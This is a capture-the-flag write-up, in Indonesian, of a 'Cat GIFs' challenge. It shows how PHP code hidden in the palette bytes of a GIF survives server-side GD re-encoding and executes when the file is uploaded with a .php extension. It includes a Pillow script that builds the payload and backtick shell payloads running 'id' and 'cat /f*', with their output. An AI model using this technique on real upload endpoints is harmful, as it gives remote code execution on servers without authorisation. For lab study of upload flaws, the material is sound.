# Cat GIFs - Writeup

Challenge ini kelihatan seperti upload gambar biasa, tapi ternyata jalur serangnya ada di proses re-encode GIF yang dilakukan server.

## Ringkasan

1. Halaman utama hanya berisi form upload GIF.
2. Saat upload GIF yang invalid, server menampilkan error dari `imagegif()`.
3. Itu berarti file upload dibuka pakai GD, lalu ditulis ulang sebagai GIF.
4. Karena file hasil upload disimpan dengan ekstensi sesuai nama asli, kita bisa unggah file `.php`.
5. Kalau isi file hasil re-encode bisa dibuat mengandung PHP tag, file itu akan dieksekusi saat dibuka.

## Enumerasi Awal

Halaman utama hanya punya form upload dan gallery.

Respon upload gagal memberi error seperti:

```text
imagegif(): Argument #1 ($image) must be of type GdImage, bool given
```

Itu petunjuk penting:

- `imagecreatefromgif()` dipakai untuk membaca file upload.
- `imagegif()` dipakai untuk menulis ulang file.
- Jadi server bukan sekadar `move_uploaded_file()`.

Saya juga cek file yang ada di target:

- `/includes/upload.php` ada, tapi kosong.
- Directory listing untuk `/includes/` dan `/uploads/` diblok.
- Tidak ada endpoint source disclosure yang langsung kelihatan.

## Temuan Kunci: Isi Palette GIF Masih Bisa Dipakai

Saya bikin GIF paletted lokal dan upload ke server.

Yang menarik, bytes palette pada GIF hasil upload masih bisa dikendalikan cukup presisi.

Contoh paling kecil:

```php
<?=1?>
```

Kalau string itu dimasukkan ke palette GIF dan file diupload sebagai `echo.php`, response dari `/uploads/echo.php` berubah jadi output PHP, bukan file GIF mentah.

Itu membuktikan:

- file `.php` hasil upload memang dieksekusi oleh Apache/PHP,
- dan payload bisa disisipkan lewat palette GIF.

## Payload Generator

Saya pakai `Pillow` untuk bikin GIF paletted.

Struktur idenya:

- isi bytes palette dengan payload PHP,
- pastikan jumlah warna cocok,
- lalu upload file hasilnya dengan nama `.php`.

Contoh generator:

```python
from PIL import Image

payload = b'<?=`id   `?>'
img = Image.new('P', (4, 1))
palette = list(payload) + [0, 0, 0] * (256 - 4)
img.putpalette(palette)
img.putdata([0, 1, 2, 3])
img.save('id4.gif', format='GIF')
```

Payload ini cukup stabil untuk 4 warna.

Untuk baca flag, payload yang dipakai:

```php
<?=`cat /f* `?>
```

Kenapa ini bekerja:

- `<?= ... ?>` adalah short echo PHP.
- Backtick menjalankan shell command.
- `cat /f*` cocok untuk kasus flag yang diletakkan di `/flag` atau `/flag.txt`.

## Validasi

Saya validasi dulu dengan `id`:

```php
<?=`id   `?>
```

Response yang keluar berisi:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Setelah itu saya ganti payload jadi `cat /f*` dan upload sebagai `cat5.php`.

Hasilnya keluar flag:

```text
dalctf{m30w_m3333333000w}
```

## Kesimpulan

Root cause challenge ini:

- server melakukan re-encode GIF dengan GD,
- tapi output GIF masih bisa dipengaruhi lewat palette bytes,
- lalu file upload disimpan dengan ekstensi user-supplied,
- jadi kita bisa menanam PHP payload di file `.php` yang valid sebagai GIF.

Kalau mau pendek:

1. Upload GIF paletted yang bytes palette-nya berisi PHP.
2. Simpan sebagai `.php`.
3. Buka file hasil upload.
4. Jalankan command untuk baca flag.

